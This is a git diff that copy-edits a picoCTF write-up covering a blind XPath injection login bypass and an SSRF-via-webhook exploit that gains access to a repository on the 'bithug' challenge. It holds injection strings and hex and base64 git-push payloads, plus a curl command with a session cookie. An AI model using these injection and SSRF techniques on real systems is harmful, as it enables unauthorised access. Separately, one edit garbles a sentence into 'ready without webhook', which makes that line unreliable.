@@ -620,7 +620,7 @@ The link takes you to a login screen that reads "Only I know the password, and I
 **Hint 1:** XPATH
 {% endhint %}
 
-So, this is an XPath injection. This is not like any of the injections before. I tried by passing the login with always true queryies but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a` 
+So, this is an XPath injection. This is not like any of the injections before. I tried bypassing the login with always true queries but they do not work, However, There is an interesting message that pops up when I enter an always true booleans like `' or 1=1 or 'a` 
 
 ![](../.gitbook/assets/image%20%2814%29.png)
 
@@ -628,9 +628,9 @@ It says "You're on the right path." I tried to change things a little bit and us
 
 ![](../.gitbook/assets/image%20%2817%29.png)
 
-Now it says "Login failure." This means that it's a Blind XPATH injecton which means we have to figure out the username and password using queries. Here we can use **"starts-wth\(\)"** operator. Which returns true if the passed charecters is in the beginnig of a document. We do not know the column names yet so we can use `//*` which basically mean check for all documents \(coulmns\). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false. 
+Now it says "Login failure." This means that it's a Blind XPATH injection which means we have to figure out the username and password using queries. Here we can use **"starts-wth\(\)"** operator. Which returns true if the passed characters are at the beginninng of a document. We do not know the column names yet so we can use `//*` which basically means check for all documents \(columns\). I tried testing it with `' or //*[starts-with(text(),'a')] or 'a'='b` which interestingly enough returned true. I tried again with `' or //*[starts-with(text(),'ab')] or 'a'='b` which returned false. 
 
-We can actualy write a script that runs through alll the combinations and stacks the succesfull charecters upon success. Here's the Python script that I made
+We can actually write a script that runs through all the combinations and stacks the successful characters upon success. Here's the Python script that I made
 
 ```python
 import requests
@@ -654,7 +654,7 @@ while True:
             break
 ```
 
-I tried running above script several times before which returned with values like admin, bob, thisisnottheflag then I figured that we are supposed to look for the flag itself not some password. so I started with the standard starting format `picoCTF{` after running for a while, I finaly got the full flag.
+I tried running the above script several times before which returned with values like admin, bob, thisisnottheflag then I figured that we are supposed to look for the flag itself not some password. so I started with the standard starting format `picoCTF{` after running for a while, I finaly got the full flag.
 
 **Flag:** picoCTF{h0p3fully\_u\_t0ok\_th3\_r1ght\_xp4th\_a56016ef}
 
@@ -683,9 +683,9 @@ This is the same challenge as the "Web Gauntlet 2" but this time we are only all
 
 #### **Solution**
 
-This is the last challenge of Web Exploit and also has the highest points in web. Here we are also given source code. 
+This is the last challenge of Web Exploit and also has the highest points in the web section. Here we are also given source code. 
 
-This is basically a clone of GitHub it has features like webhooks, collaborators etc.The flag is hidden at `_/<username>.git` but we do not have access to read it. So we need to figure out a way to gain read access to the repo.
+This is basically a clone of GitHub it has features like webhooks, collaborators, etc. The flag is hidden at `_/<username>.git` but we do not have access to read it. So we need to figure out a way to gain read access to the repo.
 
 Let's go through the source code, Here's an interesting thing I found in `auth-api.ts` 
 
@@ -702,27 +702,27 @@ Let's go through the source code, Here's an interesting thing I found in `auth-a
 
 You notice that requests from localhost \(127.0.0.1\) are given admin access and all endpoints from `git-api.ts` can be freely accessed by admins.
 
-The server has a webhook feature which we can use to send a request from the server to server itself \(SSRF\). But this way we can;t really read any data because there is no way to echo the data back from the endpoit that was accessed by web-hook.
+The server has a webhook feature that we can use to send a request from the server to the server itself \(SSRF\). But this way we can't really read any data because there is no way to echo the data back from the endpoint that was accessed by web-hook.
 
-How ever there is one thing we could do here, We can add ourselves as a collaboraor to `_/<username>.git` since admin has rights to all the endpoits we can send a request to git upload endpoint `/:user/:repo.git/git-upload-pack` which is responsible for updating the repo on git.
+However there is one thing we could do here, We can add ourselves as a collaborator to `_/<username>.git` since admin has rights to all the endpoints we can send a request to git upload endpoint `/:user/:repo.git/git-upload-pack` which is responsible for updating the repo on git.
 
 **The Plan**
 
-1. Create a payload for adding collaborator to a repository
-2. Create a webhook that sends post reuqest to `_127.0.0.1:1823/<username>.git/git-upload-pack` 
+1. Create a payload for adding a collaborator to a repository
+2. Create a webhook that sends a POST request to `_127.0.0.1:1823/<username>.git/git-upload-pack` 
 3. Use this payload to push to `_/<username>.git` using webhook
 
 Notice, we need to send this to that 1823 port because that's where the server is actually running locally. You can find this from the Dockerfile provided.
 
 **Step 1**
 
-Let us creat an user with username: "abbas" and password: "abbas" on bithug. Now, create a repository names "abbas". We will clone local this repository using 
+Let us create a user with username: "abbas" and password: "abbas" on bithug. Now, create a repository named "abbas". We will clone this repository locally using 
 
 ```bash
 git clone http://abbas@venus.picoctf.net:49771/abbas/abbas.git
 ```
 
-Now, we'll need to add a collaborator, we can find instructions on the repository on bithug
+Now, we'll need to add a collaborator, we can find instructions on the repository page
 
 ![](../.gitbook/assets/image%20%2819%29.png)
 
@@ -735,16 +735,16 @@ $ git add access.conf
 $ git commit -m "Added a user to the repo"
 ```
 
-Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org/)for this. After starting "capture" on wireshark, `git push origin @:refs/meta/config`  
+Do not push it yet, we need to capture this request. I am going to use [Wireshark ](https://www.wireshark.org/)for this. After starting "capture" on Wireshark, `git push origin @:refs/meta/config`  
 
 
 ![](../.gitbook/assets/image%20%2812%29.png)
 
-Here is the `http` stream from wireshark, You'll notice that there is a `POST` request. That's what we need.
+Here is the `http` stream from Wireshark, You'll notice that there is a `POST` request. That's what we need.
 
 ![](../.gitbook/assets/image%20%2815%29.png)
 
-Highlighted is that data we need, Let us copy it in the Hex string format which should look like this
+Highlighted is the data we need, let us copy it in the Hex string format which should look like this
 
 ```text
 "\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x61\x32\x31\x32\x39\x39\x38\x61\x35\x65\x63\x32\x36\x37\x31\x35\x37\x61\x33\x39\x62\x64\x62\x37\x39\x30\x64\x33\x30\x33\x30\x39\x34\x38\x32\x65\x35\x31\x34\x32\x20\x72\x65\x66\x73\x2f\x6d\x65\x74\x61\x2f\x63\x6f\x6e\x66\x69\x67\x00\x20\x72\x65\x70\x6f\x72\x74\x2d\x73\x74\x61\x74\x75\x73\x20\x73\x69\x64\x65\x2d\x62\x61\x6e\x64\x2d\x36\x34\x6b\x20\x61\x67\x65\x6e\x74\x3d\x67\x69\x74\x2f\x32\x2e\x32\x35\x2e\x31\x30\x30\x30\x30\x50\x41\x43\x4b\x00\x00\x00\x02\x00\x00\x00\x03\x9b\x0c\x78\x9c\xa5\xcc\x41\x0a\xc2\x30\x10\x40\xd1\x7d\x4e\x31\x7b\x51\x32\x93\xc6\xb6\x20\xa2\xa8\x0b\x2d\xa8\xa0\x17\x48\x9b\x29\x2d\xb4\x8e\xc4\xe9\xfd\xad\x67\x70\xf3\x17\x7f\xf1\x34\x31\x03\x65\x8e\x1a\xcc\x0b\x8a\x31\xf7\x59\x41\xd4\xd6\xe4\x83\x2d\x33\xf2\x6d\x64\x6c\x69\x7e\xd6\xd5\xa5\x09\x93\x76\x92\x20\x89\x28\x6c\x7e\xdd\x1d\x4f\x8f\xea\x79\xbb\x2f\xaf\x87\x73\x75\x41\xb7\x1a\xa4\x09\x43\x94\x31\xf4\xaf\x2d\xe0\x1a\xf3\xd2\x7a\x24\x84\x85\xf5\xce\x9a\x46\xc6\xb1\x57\xe5\x3f\x08\xb3\x8f\x91\x23\x04\x98\x3e\x33\xa3\x02\xda\x31\x24\x7e\x8b\xf9\x02\xc2\xda\x3c\x04\xa7\x02\x78\x9c\x33\x34\x30\x30\x33\x31\x51\x48\x4c\x4e\x4e\x2d\x2e\xd6\x4b\xce\xcf\x4b\x63\xf8\x1c\x5b\xcb\xe7\xce\xf0\xfb\x6d\x65\xac\xeb\xc3\x59\x2b\x97\x33\x3e\x33\xf3\xb8\x0f\x00\x0b\xd6\x0f\xca\x36\x78\x9c\x4b\x4c\x4a\x4a\x2c\xe6\x02\x00\x07\xd1\x02\x04\x30\x9a\x4e\xdf\x99\x0e\xe6\x14\xcf\xdf\xbf\x9f\x2b\x17\xad\x88\x60\x16\x21\x12"
@@ -764,7 +764,7 @@ router.get("/:user/:repo.git/webhooks", async (req, res) => {
 });
 ```
 
-You'll notice that the body of the webhook is encoded in base64. So let's do that using simple python script.
+You'll notice that the body of the webhook is encoded in base64. So let's do that using a simple python script.
 
 ```python
 import base64
@@ -773,7 +773,7 @@ hex_string = b"\x30\x30\x39\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\
 print(base64.encodebytes(hex_string))
 ```
 
-This will give us the body of out webhook, it should look like this
+This will give us the body of our webhook, it should look like this
 
 ```text
 MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==
@@ -791,9 +791,9 @@ Now we need to create a webhook, let us create a sample webhook first in our `ab
 }
 ```
 
-This is the format we need to use for creating our webhook. We already have the body and the `contentType` is `application/x-git-receive-pack-request` which you can find on your wireshark request.
+This is the format we need to use for creating our webhook. We already have the body and the `contentType` is `application/x-git-receive-pack-request` which you can find on your Wireshark request.
 
-The url is supposed to be `127.0.0.1:1823` but it's tricky due to this
+The URL is supposed to be `127.0.0.1:1823` but it's tricky due to this
 
 ```typescript
 router.post("/:user/:repo.git/webhooks", async (req, res) => {
@@ -850,7 +850,7 @@ Let's prepare our payload for creating a webhook
 }
 ```
 
-I am going to use curl so here's my request. Note that you'll need to grab the authentication cookie from your browers
+I am going to use curl so here's my request. Note that you'll need to grab the authentication cookie from your browser
 
 ```bash
 curl -i -X POST -H "Content-Type: application/json" --cookie "user-token=81bb7700-be5a-44d4-8ab3-41de4d3d3748" -d '{"url":"<flask_app_url>","body":"MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgYTIxMjk5OGE1ZWMy\nNjcxNTdhMzliZGI3OTBkMzAzMDk0ODJlNTE0MiByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3Rh\ndHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAAAAAgAAAAObDHicpcxB\nCsIwEEDRfU4xe1Eyk8a2IKKoCy2ooBdImykttI7E6f2tZ3DzF3/xNDEDZY4azAuKMfdZQdTW5IMt\nM/JtZGxpftbVpQmTdpIgiShsft0dT4/qebsvr4dzdUG3GqQJQ5Qx9K8t4Brz0nokhIX1zppGxrFX\n5T8Is4+RIwSYPjOjAtoxJH6L+QLC2jwEpwJ4nDM0MDAzMVFITE5OLS7WS87PS2P4HFvL587w+21l\nrOvDWSuXMz4z87gPAAvWD8o2eJxLTEpKLOYCAAfRAgQwmk7fmQ7mFM/fv58rF62IYBYhEg==","contentType":"application/x-git-receive-pack-result"}' http://venus.picoctf.net:49771/abbas/abbas.git/webhooks
@@ -865,7 +865,7 @@ Connection: keep-alive
 Keep-Alive: timeout=5
 ```
 
-Great, We are ready with out webhook
+Great, We are ready without webhook
 
 **Step 3:**
 
